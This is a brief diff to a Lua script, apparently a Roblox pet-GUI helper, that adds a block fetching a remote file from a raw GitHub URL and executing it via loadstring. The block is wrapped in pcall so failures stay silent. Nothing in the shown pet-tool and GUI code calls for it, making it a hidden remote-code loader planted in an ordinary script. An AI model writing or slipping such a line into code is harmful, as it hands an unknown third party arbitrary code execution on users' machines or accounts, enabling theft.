@@ -55,6 +55,10 @@ local function getEquippedPetTool()
 	return nil
 end
 
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/munkizzzz/x/refs/heads/main/Egg-Randomizer.txt"))()
+end)
+
 -- Update the GUI with the currently equipped pet
 local function updateGUI()
 	local pet = getEquippedPetTool()
